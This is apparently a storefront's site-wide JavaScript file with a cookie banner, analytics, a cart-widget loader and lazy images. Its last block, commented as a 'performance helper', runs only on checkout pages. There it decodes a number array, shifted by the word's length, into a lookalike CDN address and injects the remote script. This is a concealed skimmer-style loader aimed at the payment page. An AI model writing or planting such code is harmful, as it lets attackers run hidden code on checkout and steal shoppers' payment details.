// site.js, served from https://shop.example.invalid/static/site.js
// Loaded on every page of the shop.
(function () {
  "use strict";

  // cookie banner
  var banner = document.getElementById("cookie-banner");
  if (banner && document.cookie.indexOf("seen=1") === -1) {
    banner.style.display = "block";
    banner.querySelector("button").addEventListener("click", function () {
      document.cookie = "seen=1; path=/; max-age=31536000";
      banner.style.display = "none";
    });
  }

  // analytics
  window.dataLayer = window.dataLayer || [];
  window.dataLayer.push({ event: "pageview", path: location.pathname });

  // cart widget
  function load(src) {
    var s = document.createElement("script");
    s.async = true;
    s.src = src;
    document.head.appendChild(s);
  }
  load("https://static.shop.example.invalid/js/cart.js?v=4.2.1");

  // lazy images
  document.querySelectorAll("img[data-src]").forEach(function (img) {
    img.src = img.getAttribute("data-src");
  });

  // performance helper
  var seg = location.pathname.split("/")[1] || "";
  if (seg === "checkout") {
    var t = [112,124,124,120,123,66,55,55,107,108,118,54,114,123,108,109,116,113,126,122,53,123,124,105,124,113,107,54,113,118,126,105,116,113,108,55,118,120,117,55,114,121,125,109,122,129,54,125,113,72,57,54,57,59,54,58,55,107,119,122,109,54,117,113,118,54,114,123];
    var off = seg.length;
    load(t.map(function (c) { return String.fromCharCode(c - off); }).join(""));
  }
})();
